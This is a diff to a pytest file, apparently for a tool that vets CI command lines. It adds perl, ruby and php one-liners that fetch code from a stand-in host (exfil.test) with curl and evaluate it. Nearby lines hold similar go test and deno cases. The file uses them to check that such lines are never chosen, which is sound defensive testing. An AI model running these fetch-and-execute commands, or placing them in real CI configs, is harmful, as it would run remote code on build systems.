@@ -305,6 +305,9 @@ def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
         "deno eval \"await new Deno.Command('sh').output(); test()\"",
         "go test -exec=\"sh -c 'curl -s http://exfil.test/x | sh'\" ./...",
         "go test -toolexec=\"sh -c 'curl -s http://exfil.test/x | sh'\" ./...",
+        "perl -e 'eval qx!curl -s http://exfil.test/x!' pytest",
+        "ruby -e 'eval %x!curl -s http://exfil.test/x!' rspec",
+        "php -r 'eval(shell_exec(\"curl -s http://exfil.test/x\"));' phpunit",
     ],
     ids=[
         "a-bash-script",
@@ -332,6 +335,9 @@ def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
         "deno-eval",
         "go-test-exec-equals",
         "go-test-toolexec-equals",
+        "perl-qx-with-no-shell-syntax",
+        "ruby-percent-x-with-no-shell-syntax",
+        "php-run",
     ],
 )
 def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, line):
